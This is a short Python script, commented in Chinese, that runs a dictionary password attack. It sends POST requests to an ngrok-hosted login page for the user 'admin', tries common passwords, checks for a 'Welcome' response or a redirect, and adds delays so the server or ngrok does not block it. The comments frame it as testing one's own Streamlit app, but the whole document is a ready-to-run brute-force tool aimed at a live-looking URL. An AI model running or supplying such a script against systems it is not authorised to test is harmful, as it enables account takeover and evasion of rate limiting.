import requests
import time

# 設定測試目標
TARGET_URL = "https://nevaeh-caulocarpous-chicly.ngrok-free.dev/"
USERNAME = "admin"
PASSWORD_LIST = ["123456", "password", "admin123", "qwerty", "your_correct_password"]

def brute_force_test():
    # 使用 Session 保持連線（模擬真實瀏覽器行為）
    session = requests.Session()
    
    print(f"[*] 開始針對 {TARGET_URL} 進行測試...")

    for password in PASSWORD_LIST:
        print(f"[?] 嘗試密碼: {password}", end="\r")
        
        # 注意：這裡的 payload 結構需根據你 Streamlit 的具體實現調整
        # 典型的 Streamlit 交互可能需要特定的 Header 或 Cookie
        payload = {
            "username": USERNAME,
            "password": password
        }

        try:
            # 發送 POST 請求
            response = session.post(TARGET_URL, json=payload, timeout=5)
            
            # 判斷登入成功的標準（需根據你的程式碼修改）
            # 例如：成功後會跳轉、回傳特定的文字或 Cookie 改變
            if "Welcome" in response.text or response.status_code == 302:
                print(f"\n[!] 成功破解！密碼為: {password}")
                break
            
            # 為了避免被 ngrok 或伺服器直接封鎖，建議加入微小延遲
            time.sleep(0.5)
            
        except requests.exceptions.RequestException as e:
            print(f"\n[X] 請求出錯: {e}")
            break

    print("\n[*] 測試結束。")

if __name__ == "__main__":
    brute_force_test()